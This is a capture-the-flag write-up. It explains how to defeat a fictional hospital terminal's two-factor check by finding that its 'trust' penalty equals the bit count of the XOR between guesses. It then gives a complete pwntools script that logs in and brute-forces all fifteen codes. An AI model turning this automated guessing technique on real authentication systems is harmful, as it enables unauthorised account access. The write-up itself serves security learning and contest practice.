# Grey's Anatomy
>Can you compromise the medical records of Seattle Grace Hospital? We've obtained a set of credentials (mgrey/1515) but haven't figured out how to bypass the second factor authentication.
>
>0.cloud.chals.io on:11444

A very funny title and description, obviously based off the show. 

---
## Introduction
After connecting to the port and entering in the given credentials, we get some more information about the second factor authentication
```
Welcome to the Seattle Grace Hospital EMR Terminal Access Program
Please enter your credentials to access patient records.
Username:
mgrey
Password:
1515
Due to increased security concerns around patient health records, we have recently implemented two-factor authentication.
Please enter the series of 15 3-digit codes found on your 2 factor enabled device.
UPDATE: Due to complaints, we have implemented a custom "trust" meter which will allow you to re-enter a code if you mistype.
Your trust goes down more if it looks like you are randomly guessing.
Enter Code #1 (Trust: 1000):
```
Looks like we need to somehow guess all 15 codes without our trust running out.

Guessing some random codes, we see that the trust seemingly decreases at random.
```
Enter Code #1 (Trust: 1000):
323
Incorrect Code, please re-enter
Enter Code #1 (Trust: 1000):
541
Incorrect Code, please re-enter
Enter Code #1 (Trust: 993):
763
Incorrect Code, please re-enter
Enter Code #1 (Trust: 988):
335
Incorrect Code, please re-enter
Enter Code #1 (Trust: 982):
863
Incorrect Code, please re-enter
Enter Code #1 (Trust: 980):
```
After some more messing around, we see that the decrease seems to depend on the previous guess and the current guess.
It also doesn't seem to depend on the order: 999 -> 998 decreases by 1, just like 998 -> 999
```
999
Incorrect Code, please re-enter
Enter Code #1 (Trust: 976):
998
Incorrect Code, please re-enter
Enter Code #1 (Trust: 975):
999
Incorrect Code, please re-enter
Enter Code #1 (Trust: 974):
998
Incorrect Code, please re-enter
Enter Code #1 (Trust: 973):
999
Incorrect Code, please re-enter
Enter Code #1 (Trust: 972):
998
Incorrect Code, please re-enter
Enter Code #1 (Trust: 971):
999
```
Seems like the goal is to find a way to guess the numbers such that the trust decreases by 1 every time, allowing us to guess
all 1000 3-digit pins. We just have to repeat it 15 times for the flag.

## Finding a pattern
After some more experimenting, I found a few small patterns for possible pairs (with trust decrease of 1):
- Any odd number and the even number directly below it form a pair
  - Ex: `999 998`
- Only pairs that are a power of 2 apart work (but not all of them)
  - Ex: `999 995` work, but not `999 983`
This probably means that the trust is related to something with the bits of each number.

However, after a while, I resorted to brute forcing all possible pairs to find the pattern.

# Solution
As it turns out, the trust decrease was based on the number of 1 bits remaining in the xor of the previous and current guess.
That's why guessing the same number also results in a decrease of 0, as a number xored with itself is just 0. 

I then manually created all possible pairs using [this code](getgraph.py)
```python
def getDelta(a: int, b: int):
    return (a ^ b).bit_count()

for i in range(1000):
    print(i)
    edges = []
    A = i
    for j in range(10):
        B = A + (2 ** j)
        # print(A, B)
        if B < 1000:
            delta = getDelta(A, B)
            cur = edges
            if delta == 1:
                edges.append(B)
            edges = cur
        B = A - (2 ** j)
        # print(A, B)
        if B > 0:
            delta = getDelta(A, B)
            cur = edges
            if delta == 1:
                edges.append(B)
            edges = cur
    with open("egg.txt", "a") as f:
        f.write(str(edges))
        f.write("\n")
```
Only numbers a power of 2 away could possibly have a decrease of 1 as a difference by a power of 2 represents toggling a certain bit.

After generating all the numbers, I could then just easily DFS the graph I had created, using each pair as an edge. 
I didn't test if the graph was guarenteed to work, but given that each number had at least 8 connections, it was very likely.
```python
import pwn
# 0.cloud.chals.io on:11444

with open("egg.txt", "r") as f:
    data = f.read()

edges = {}
for i, line in enumerate(data.split("\n")):
    if line == "":
        continue
    edges[i] = eval(line)


s = pwn.remote('0.cloud.chals.io', 11444)

s.recvline_contains(b'Username:')
s.send_raw(b'mgrey\n')
s.recvline_contains(b'Password:')
s.send_raw(b'1515\n')

for i in range(15):
    guesses = set()
    solved = False
    lastguess = -1
    guess = 0

    while not solved:
        line = s.recvline_contains(b'Enter')
        line = line.decode('utf-8').strip().split(' ')
        trust = int(line[-1][:-2])
        lastguess = guess
        guess = -1
        for j in edges[lastguess]:
            if j in guesses:
                continue
            guess = j
        if guess == -1:
            print("fail")
            exit()
        guesses.add(guess)
        #print("size", len(guesses))
        g = str(guess).rjust(3, '0').encode('utf-8') + b'\n'
        # print(g)
        s.send_raw(g)
        line = s.recvline()
        # print(line)
        if line == b'Correct Code\n':
            print(line)
            solved = True

s.interactive()
```
Now we just have to run the script and get the flag :smiley:

And our flag is:
```
uscg{Gr4y_c0d3S}
```